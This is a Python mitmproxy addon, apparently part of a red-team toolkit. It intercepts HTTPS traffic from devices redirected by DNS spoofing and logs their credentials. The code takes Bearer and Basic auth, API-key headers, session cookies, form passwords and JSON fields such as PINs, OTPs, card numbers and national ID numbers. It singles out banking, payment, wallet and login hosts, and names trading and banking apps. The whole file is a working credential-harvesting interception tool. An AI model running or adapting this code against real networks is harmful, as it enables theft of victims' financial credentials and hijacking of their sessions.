"""
mitmproxy addon for hot net mitm --ssl-intercept mode.

Intercepts HTTPS/HTTP traffic via DNS spoof + reverse proxy:
- Full request/response logging (URL, headers, body)
- Credential extraction (form POST, JSON auth, API tokens, cookies)
- Sensitive field detection in JSON bodies
- Mobile app traffic (SSI iBoard, trading apps, banking, etc.)
- Dynamic upstream resolution from DNS spoof map

Usage: mitmdump --mode reverse:https://dummy/ --ssl-insecure -s mitm_addon.py --set logdir=./reports/mitm --set dns_map=./reports/mitm/dns_map.json
"""

import json
import os
import re
from datetime import datetime
from urllib.parse import parse_qs, unquote_plus

from mitmproxy import http, ctx


# Sensitive field patterns
SENSITIVE_FIELDS = re.compile(
    r"(?:password|passwd|pass|pwd|secret|token|api[_-]?key|access[_-]?key|"
    r"auth|credential|session|jwt|bearer|pin|otp|mfa|totp|"
    r"credit[_-]?card|cc[_-]?num|cvv|cccd|cmnd|so_cmnd|"
    r"ssn|social[_-]?security|tax[_-]?id|"
    r"private[_-]?key|signing[_-]?key|encryption[_-]?key|"
    r"account[_-]?number|routing[_-]?number|iban|swift|"
    r"trading[_-]?pin|stock[_-]?pin|"
    r"phone|mobile|email|address|dob|birth)",
    re.IGNORECASE,
)

# High-value target keywords (match anywhere in the hostname)
TARGET_DOMAINS = [
    "bank", "payment", "wallet", "checkout",
    "login", "auth", "oauth", "signin", "signup",
    "api", "admin", "dashboard",
]


class MITMAddon:
    def __init__(self):
        self.logdir = "./reports/mitm"
        self.logfile = None
        self.event_count = 0
        self.cred_count = 0
        self.stats = {"requests": 0, "credentials": 0, "sensitive": 0, "target_hits": 0}
        self.dns_map = {}  # domain -> real_ip (from DNS spoof)
        self.dns_map_file = None

    def load(self, loader):
        loader.add_option("logdir", str, "./reports/mitm", "Log output directory")
        loader.add_option("dns_map", str, "", "Path to DNS map JSON (domain->real_ip)")

    def configure(self, updated):
        if "logdir" in updated:
            self.logdir = ctx.options.logdir
        if "dns_map" in updated and ctx.options.dns_map:
            self.dns_map_file = ctx.options.dns_map
            self._reload_dns_map()
        os.makedirs(self.logdir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.logfile = os.path.join(self.logdir, f"ssl_intercept_{timestamp}.jsonl")
        ctx.log.info(f"[red-mitm] Logging to {self.logfile}")

    def _reload_dns_map(self):
        """Reload DNS map from file (written by SSLInterceptor)."""
        if self.dns_map_file and os.path.exists(self.dns_map_file):
            try:
                with open(self.dns_map_file, "r") as f:
                    self.dns_map = json.load(f)
                ctx.log.info(f"[red-mitm] DNS map loaded: {len(self.dns_map)} domains")
            except Exception as e:
                ctx.log.warn(f"[red-mitm] Failed to load DNS map: {e}")

    def requestheaders(self, flow: http.HTTPFlow):
        """Rewrite upstream address based on DNS map (for reverse proxy mode).

        In reverse proxy mode, flow.request.host is the dummy upstream (127.0.0.1).
        The real target domain is in the Host header (sent by the client).
        We look up the real IP from our DNS map and rewrite flow.request.host/port
        so mitmproxy connects to the actual upstream server.
        With connection_strategy=lazy, the server connection is deferred until now.
        """
        self._reload_dns_map()

        # In reverse proxy mode, Host header is rewritten to upstream target (127.0.0.1).
        # Use TLS SNI (most reliable) then fallback to Host header.
        domain = ""
        # 1. TLS SNI from client handshake — always has the real domain
        if hasattr(flow.client_conn, 'sni') and flow.client_conn.sni:
            domain = flow.client_conn.sni
        # 2. Fallback: Host header (works if keep_host_header=true)
        if not domain or domain in ("127.0.0.1", "localhost"):
            host_header = flow.request.host_header or ""
            candidate = host_header.split(":")[0].strip()
            if candidate and candidate not in ("127.0.0.1", "localhost"):
                domain = candidate
        domain = domain.rstrip(".")

        if not domain or domain in ("127.0.0.1", "localhost"):
            return

        # Set flow.request.host to the DOMAIN (not IP) so that:
        # 1. mitmproxy sends correct TLS SNI to upstream (critical for Cloudflare)
        # 2. mitmproxy resolves domain via its own DNS (not spoofed — BPF filter
        #    only intercepts target devices' DNS, not ours)
        # 3. Host header is correct for the upstream server
        flow.request.host = domain
        flow.request.port = 443
        flow.request.headers["Host"] = domain
        ctx.log.info(f"[red-mitm] Upstream: {domain} → DNS resolve (SNI correct)")

    def _log(self, event: dict):
        """Append event to JSONL log."""
        if self.logfile:
            with open(self.logfile, "a") as f:
                f.write(json.dumps(event, ensure_ascii=False, default=str) + "\n")
        self.event_count += 1

    def _is_target(self, host: str) -> bool:
        """Check if host is a high-value target."""
        host_lower = host.lower()
        return any(t in host_lower for t in TARGET_DOMAINS)

    def _extract_sensitive_fields(self, data, prefix="") -> dict:
        """Recursively extract sensitive fields from dict/JSON."""
        result = {}
        if isinstance(data, dict):
            for k, v in data.items():
                path = f"{prefix}.{k}" if prefix else k
                if SENSITIVE_FIELDS.search(k) and isinstance(v, (str, int, float)):
                    result[path] = str(v)[:500]
                elif isinstance(v, (dict, list)):
                    result.update(self._extract_sensitive_fields(v, path))
        elif isinstance(data, list):
            for i, item in enumerate(data[:10]):
                result.update(self._extract_sensitive_fields(item, f"{prefix}[{i}]"))
        return result

    def _extract_form_creds(self, body: str) -> dict:
        """Extract credentials from URL-encoded form body."""
        creds = {}
        try:
            params = parse_qs(body, keep_blank_values=True)
            for key, values in params.items():
                if SENSITIVE_FIELDS.search(key):
                    creds[key] = unquote_plus(values[0]) if values else ""
        except Exception:
            pass
        return creds

    def request(self, flow: http.HTTPFlow):
        """Intercept HTTP/HTTPS request."""
        req = flow.request
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # Get real domain: SNI > Host header > request host
        host = ""
        if hasattr(flow.client_conn, 'sni') and flow.client_conn.sni:
            host = flow.client_conn.sni
        if not host or host in ("127.0.0.1", "localhost"):
            host = (req.host_header or req.host or "").split(":")[0]
        url = req.pretty_url
        self.stats["requests"] += 1

        is_target = self._is_target(host)
        if is_target:
            self.stats["target_hits"] += 1

        # Base event
        event = {
            "time": ts,
            "type": "https_request" if req.scheme == "https" else "http_request",
            "src": flow.client_conn.peername[0] if flow.client_conn.peername else "?",
            "dst": f"{host}:{req.port}",
            "method": req.method,
            "url": url,
            "host": host,
            "scheme": req.scheme,
            "user_agent": req.headers.get("User-Agent", "")[:200],
            "content_type": req.headers.get("Content-Type", ""),
            "is_target": is_target,
        }

        # ── Auth headers ──
        auth = req.headers.get("Authorization", "")
        if auth:
            event["authorization"] = auth[:500]
            if auth.lower().startswith("bearer "):
                self._log({
                    "time": ts, "type": "cred_bearer",
                    "src": event["src"], "dst": event["dst"],
                    "host": host, "url": url,
                    "token": auth[7:][:500],
                })
                self.stats["credentials"] += 1
                self.cred_count += 1
            elif auth.lower().startswith("basic "):
                import base64
                try:
                    decoded = base64.b64decode(auth[6:]).decode()
                except Exception:
                    decoded = auth[6:]
                self._log({
                    "time": ts, "type": "cred_basic",
                    "src": event["src"], "dst": event["dst"],
                    "host": host, "url": url,
                    "credentials": decoded,
                })
                self.stats["credentials"] += 1
                self.cred_count += 1

        # ── API tokens in headers ──
        for hdr in ["X-API-Key", "X-Auth-Token", "X-Access-Token",
                     "X-CSRF-Token", "Api-Key", "X-Session-Token"]:
            val = req.headers.get(hdr, "")
            if val:
                self._log({
                    "time": ts, "type": "cred_api_token",
                    "src": event["src"], "dst": event["dst"],
                    "host": host, "header": hdr, "value": val[:300],
                })
                self.stats["credentials"] += 1
                self.cred_count += 1

        # ── Cookies ──
        cookies = req.headers.get("Cookie", "")
        if cookies and any(kw in cookies.lower() for kw in
                          ["session", "token", "auth", "jwt", "sid",
                           "phpsessid", "jsessionid", "access"]):
            self._log({
                "time": ts, "type": "session_cookie",
                "src": event["src"], "dst": event["dst"],
                "host": host, "cookie": cookies[:1000],
            })
            self.stats["credentials"] += 1

        # ── Request body ──
        if req.content and req.method in ("POST", "PUT", "PATCH"):
            body_text = req.get_text(strict=False) or ""
            content_type = req.headers.get("Content-Type", "").lower()

            # Always log body for target domains
            if is_target:
                event["body"] = body_text[:5000]

            # Form POST credentials
            if "form" in content_type or "urlencoded" in content_type:
                creds = self._extract_form_creds(body_text)
                if creds:
                    self._log({
                        "time": ts, "type": "cred_form_post",
                        "src": event["src"], "dst": event["dst"],
                        "host": host, "url": url,
                        "fields": creds,
                        "full_body": body_text[:2000],
                    })
                    self.stats["credentials"] += 1
                    self.cred_count += 1

            # JSON body sensitive fields
            if "json" in content_type or body_text.strip().startswith("{"):
                try:
                    data = json.loads(body_text)
                    sensitive = self._extract_sensitive_fields(data)
                    if sensitive:
                        self._log({
                            "time": ts, "type": "sensitive_json_request",
                            "src": event["src"], "dst": event["dst"],
                            "host": host, "url": url,
                            "fields": sensitive,
                            "full_body": body_text[:3000] if is_target else body_text[:1000],
                        })
                        self.stats["sensitive"] += 1
                except json.JSONDecodeError:
                    pass

        self._log(event)

        # Console output for interesting events
        if is_target or auth or self.cred_count > (self.stats["credentials"] - 1):
            marker = "🎯" if is_target else "📡"
            ctx.log.warn(f"[red-mitm] {marker} {req.method} {url}")

    def response(self, flow: http.HTTPFlow):
        """Intercept HTTP/HTTPS response."""
        resp = flow.response
        req = flow.request
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        host = ""
        if hasattr(flow.client_conn, 'sni') and flow.client_conn.sni:
            host = flow.client_conn.sni
        if not host or host in ("127.0.0.1", "localhost"):
            host = (req.host_header or req.host or "").split(":")[0]
        is_target = self._is_target(host)

        event = {
            "time": ts,
            "type": "https_response" if req.scheme == "https" else "http_response",
            "src": f"{host}:{req.port}",
            "dst": flow.client_conn.peername[0] if flow.client_conn.peername else "?",
            "url": req.pretty_url,
            "status": resp.status_code,
            "content_type": resp.headers.get("Content-Type", ""),
            "content_length": len(resp.content) if resp.content else 0,
            "server": resp.headers.get("Server", ""),
        }

        # ── Set-Cookie ──
        set_cookies = resp.headers.get_all("Set-Cookie")
        if set_cookies:
            event["set_cookies"] = [c[:500] for c in set_cookies]
            # Check for session tokens
            for c in set_cookies:
                if any(kw in c.lower() for kw in ["session", "token", "auth", "jwt", "access"]):
                    self._log({
                        "time": ts, "type": "set_cookie_session",
                        "host": host, "url": req.pretty_url,
                        "cookie": c[:500],
                    })

        # ── Response body ──
        if resp.content:
            content_type = resp.headers.get("Content-Type", "").lower()
            body_text = resp.get_text(strict=False) or ""

            # Always log full response for target domains
            if is_target:
                event["body"] = body_text[:10000]

            # JSON response sensitive fields
            if "json" in content_type:
                try:
                    data = json.loads(body_text)
                    sensitive = self._extract_sensitive_fields(data)
                    if sensitive:
                        self._log({
                            "time": ts, "type": "sensitive_json_response",
                            "host": host, "url": req.pretty_url,
                            "status": resp.status_code,
                            "fields": sensitive,
                            "full_body": body_text[:5000] if is_target else body_text[:1000],
                        })
                        self.stats["sensitive"] += 1
                except json.JSONDecodeError:
                    pass

        self._log(event)

    def done(self):
        """Summary when proxy shuts down."""
        ctx.log.warn("[red-mitm] === SSL Intercept Summary ===")
        ctx.log.warn(f"[red-mitm] Requests:    {self.stats['requests']}")
        ctx.log.warn(f"[red-mitm] Credentials: {self.stats['credentials']}")
        ctx.log.warn(f"[red-mitm] Sensitive:   {self.stats['sensitive']}")
        ctx.log.warn(f"[red-mitm] Target hits: {self.stats['target_hits']}")
        ctx.log.warn(f"[red-mitm] Log file:    {self.logfile}")


addons = [MITMAddon()]
